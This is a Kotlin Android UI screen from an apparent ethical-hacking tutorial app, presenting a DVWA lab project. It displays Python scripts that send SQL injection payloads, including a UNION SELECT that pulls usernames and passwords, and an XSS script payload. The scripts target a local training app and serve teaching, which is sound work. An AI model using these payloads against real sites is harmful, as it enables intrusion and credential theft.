package com.example.hackwithpython.projects

import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Text
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.Button
import androidx.compose.ui.Modifier
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.navigation.NavController

@Composable
fun Project8Screen(navController: NavController) {
    Column(modifier = Modifier
        .padding(16.dp)
        .verticalScroll(rememberScrollState()),
        verticalArrangement = Arrangement.Top,
        horizontalAlignment = Alignment.Start) {
        Text(
            text = "Project 8: Exploit Vulnerable Web Apps",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Introduction Section
        Text(
            text = """
                In this project, you will set up and exploit a vulnerable web application, such as Damn Vulnerable Web Application (DVWA).
                You'll learn how to create automated scripts for common web attacks, including SQL injection and Cross-Site Scripting (XSS).
                This project is essential for understanding real-world vulnerabilities and how attackers exploit them.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Prerequisites
        Text(
            text = "Prerequisites",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                Before you start, ensure you have:
                - A basic understanding of web technologies (HTML, CSS, JavaScript).
                - Familiarity with SQL and how databases interact with web applications.
                - Python programming skills for creating automated scripts.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Project Description
        Text(
            text = "Project Description",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                This project involves two main tasks:
                1. **Setting Up DVWA**: Install and configure DVWA on your local environment or a virtual machine.
                2. **Creating Automated Attack Scripts**: Write Python scripts to automate SQL injection and XSS attacks against DVWA.
                
                Understanding how to exploit vulnerabilities in a controlled environment will enhance your skills in ethical hacking.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Python Example Code
        Text(
            text = "Python Code Example: SQL Injection Automation",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                Below is an example of a Python script that automates SQL injection on a vulnerable endpoint:
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                import requests
                
                url = 'http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#'
                payloads = ["1' OR '1'='1", "1' UNION SELECT 1, username, password FROM users--"]

                for payload in payloads:
                    response = requests.get(url + payload)
                    if "user" in response.text:
                        print(f"Potentially vulnerable to SQL injection with payload: {payload}")
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Python Example Code for XSS Automation
        Text(
            text = "Python Code Example: XSS Automation",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                Below is an example of a Python script that automates XSS testing:
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                import requests

                url = 'http://localhost/dvwa/vulnerabilities/xss_enter.php'
                payload = "<script>alert('XSS')</script>"

                response = requests.post(url, data={'name': payload})
                if payload in response.text:
                    print("XSS vulnerability found!")
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Ethical Use Disclaimer
        Text(
            text = "Ethical Use Disclaimer",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                This project is for educational purposes only. Ensure that you have permission to test any web application 
                and use this knowledge responsibly to enhance security.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        Spacer(modifier = Modifier.height(32.dp))

        // Button to navigate to the next project
        Button(onClick = { navController.navigate("project9") }) {
            Text(text = "Next Project")
        }
    }
}
